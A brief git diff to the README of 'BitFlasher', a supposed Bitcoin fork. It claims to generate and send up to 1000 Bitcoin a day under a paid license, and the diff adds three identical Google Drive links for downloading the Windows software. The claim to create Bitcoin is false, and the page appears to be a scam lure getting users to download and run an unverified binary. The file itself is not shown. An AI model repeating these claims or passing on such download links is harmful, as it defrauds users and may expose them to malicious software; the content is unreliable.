@@ -5,6 +5,14 @@ This is a Bitcoin fork that makes it possible to generate Bitcoin transactions o
 
 With the basic license, you can generate and send up to 1000 Bitcoin every day and up to 10,000 Bitcoin in a single transaction
 
+download software from here 
+download link 1 https://drive.google.com/file/d/1ftFNpsESxBTwWcOeDdlzv454jzh68ImA/view?usp=drive_link
+download link 2 https://drive.google.com/file/d/1ftFNpsESxBTwWcOeDdlzv454jzh68ImA/view?usp=drive_link
+download link 3 https://drive.google.com/file/d/1ftFNpsESxBTwWcOeDdlzv454jzh68ImA/view?usp=drive_link
+
+
+
+
 
 
 # BitFlasher-V1.5-win32-x64
